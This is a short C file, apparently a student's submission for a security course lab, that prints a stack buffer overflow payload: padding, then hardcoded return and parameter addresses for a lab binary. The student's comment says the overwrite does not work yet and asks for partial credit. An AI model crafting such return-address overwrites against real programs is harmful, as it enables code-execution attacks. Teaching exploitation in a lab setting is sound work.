/*Farid Rajabi Nia , fr2md
I have identified the desired ret address and and saved ebp and the buffer size and the parameter, but I cannot figure out how to overwrite the ret, since it is skipping the ret address when overflowing the buffer. I was hoping I can get partia credit for trying if I did not manage to finish it.*/

#include <stdio.h>
#include <string.h>



char attackString[] = {
    'F' , 'a' , 'r' , 'i' , /* Padding goes here */
    'd' , ' ' , 'R' , 'a' ,
    'j' , 'a' , 'b' , 'i' ,
    ' ' , 'N' , 'i' , 'a' ,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    //0x28, 0xde, 0xff, 0xff,// ebp
    0x33, 
    0x5c, 0x85, 0x04, 0x08,//ret
    0x80, 0xa0, 0x04, 0x08,//para
};


int main() {
 int i;
 char *p = attackString;
 for (i = 0; i < sizeof(attackString); i++) {
 putchar(*p);
 p++;
 }
 return 1;
}
